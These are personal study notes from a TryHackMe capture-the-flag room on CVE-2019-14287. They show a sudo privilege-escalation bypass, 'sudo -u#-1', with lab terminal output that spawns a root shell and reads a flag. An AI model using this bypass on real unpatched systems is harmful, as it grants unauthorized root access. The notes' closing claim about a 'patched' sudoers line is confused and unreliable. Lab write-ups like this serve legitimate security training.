
CVE-2019-14287 is a vulnerability found in the Unix Sudo program by a researcher working for Apple: Joe Vennix. 

Coincidentally, he also found the vulnerability that we'll be covering in the next room of this series.

This exploit has since been fixed, but may still be present in older versions of Sudo (versions < 1.8.28), so it's well worth keeping an eye out for!


This usually defaults to the superuser (root), but it's also possible to execute programs as other users by specifying their username or UID. For example, sudo would usually be used like so:

sudo [command]

But, we can manually choose to execute it as another user like this:

sudo -u#[id] [command] ----> This means I would be pretending to be another user

when you executed the chosen command, which can give you higher permissions than you might otherwise have had. 

usage:
1.
$ sudo -u mom pwd

/home/kali/Desktop/Kali Docs/CTF/THM/sudo_vuln/Sudo Security Bypass


$ sudo --user=mom pwd

/home/kali/Desktop/Kali Docs/CTF/THM/sudo_vuln/Sudo Security Bypass

 
$ sudo -u#1001 pwd

/home/kali/Desktop/Kali Docs/CTF/THM/sudo_vuln/Sudo Security Bypass

For Eg:

$ ll
total 8
-rw-r--r-- 1 kali kali 1015 Feb 13 02:35 ans.txt
-rw------- 1 root root    9 Feb 13 02:42 file.txt
 

$ cat file.txt 
cat: file.txt: Permission denied


$ sudo cat file.txt 
Oefefvev

---> so I used sudo to temporarily give myself root privileges, in order to read the file.


✓ Like many commands on Unix systems, sudo can be configured by editing a 
  configuration file on your system.

 In this case that file is called /etc/sudoers.

Editing this file directly is not recommended (we can't even open it with normal vim editor)  due to its importance to the OS installation, however, you can safely edit it with the command : 

sudo visudo

which checks when you're saving to ensure that there are no misconfigurations.


The vulnerability we're interested in for this task occurs in a very particular scenario. 

Say you have a user who you want to grant extra permissions to. You want to let this user execute a program as if they were any other user, but you don't want to let them execute it as root. You might add this line to the sudoers file:

<user> ALL=(ALL:!root) NOPASSWD: ALL


This would let your user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. In other words, you can pretend to be any user, except from the admin.

Theoretically only !!


In practice, with vulnerable versions of Sudo you can get around this restriction to execute the programs as root anyway, which is obviously great for privilege escalation!

With the above configuration, using sudo -u#0 <command> (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter CVE-2019-14287.

                               Could not understand      <---+  
                                                             |
Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, despite being explicitly prevented from doing so. It is worth noting that this will only work if you've been granted non-root sudo permissions for the command, as in the configuration above.

For Eg:

$ sudo -u#-1 id -u

0

|
+----> Misinterpreting -1 UID as root (UID 0)

Practically, the application of this is as follows: 

sudo -u#-1 <command>


$ whoami

tryhackme

$ sudo -u#-1 whoami

root


1. What command are you allowed to run with sudo?

$ sudo -ll

Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:

Sudoers entry:
    RunAsUsers: ALL, !root
    Options: !authenticate
    Commands:
        /bin/bash


-----> /bin/bash


2. What is the flag in /root/root.txt?

$ sudo -u#-1 ls
[sudo] password for tryhackme: 
Sorry, user tryhackme is not allowed to execute '/bin/ls' as #-1 on sudo-privesc

$ sudo -u#-1 /bin/bash
# whoami

root

# cat /root/root.txt 

THM{l33t_s3cur1ty_bypass}

-------------------------------------------------------------

This the stable version of sudo after being patched

%sudo   ALL=(ALL:ALL) ALL

The $sudo (or %admin) part of this line is a reference to the sudo (or admin) group. The rest of the line allows members of this group to run any command as any user. This much is built in. If you don’t want anyone to have this ability, don’t put anyone in the sudo (or admin) group on your system and this privilege level will not be implemented.

